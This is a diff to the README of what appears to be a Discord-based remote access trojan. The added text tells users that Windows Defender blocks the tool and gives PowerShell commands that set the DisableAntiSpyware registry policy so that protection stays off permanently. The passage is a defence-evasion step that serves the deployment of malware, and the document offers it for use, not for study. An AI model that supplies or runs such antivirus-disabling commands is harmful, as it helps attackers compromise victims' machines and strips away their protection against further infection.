@@ -231,5 +231,12 @@ E          X          A          M          P          L          E          S
 49. !help              // Displays information about available commands
     Example: !help
 ```
+> **Note:** Windows blocks this script if Real Time Protection is on. To disable permanently, run this in powershell (admin):
+>
+> ```powershell
+> New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -ErrorAction SilentlyContinue | Out-Null
+> New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -PropertyType DWORD -Value 1 -Force
+> ```
+
 
 special thanks to [@noom825](https://github.com/moom825/Discord-RAT-2.0/commits?author=moom825) for the dll's!
